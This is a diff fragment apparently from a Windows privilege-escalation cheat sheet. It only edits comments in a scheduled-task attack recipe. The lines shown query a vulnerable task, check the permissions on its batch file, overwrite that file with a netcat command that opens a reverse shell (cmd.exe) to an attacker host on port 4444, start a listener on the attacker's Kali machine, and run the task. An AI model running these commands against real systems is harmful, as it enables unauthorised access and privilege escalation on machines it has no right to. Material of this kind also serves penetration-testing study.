@@ -190,9 +190,9 @@ schtasks /query /tn vulntask /fo list /v  # Receive complete information about a
 ------------------------------
 icacls c:\tasks\schtask.bat # check the file permissions in target system 
 ------------------------------
-echo c:\tools\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\tasks\schtask.bat # target system
+echo c:\tools\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\tasks\schtask.bat # Add a Reverse Shell in the executable file
 ------------------------------
-nc -lvnp 4444 # our kali
+nc -lvnp 4444 # Launch Lenner on the Hacker System
 ------------------------------
 schtasks /run /tn vulntask # target system
 ```
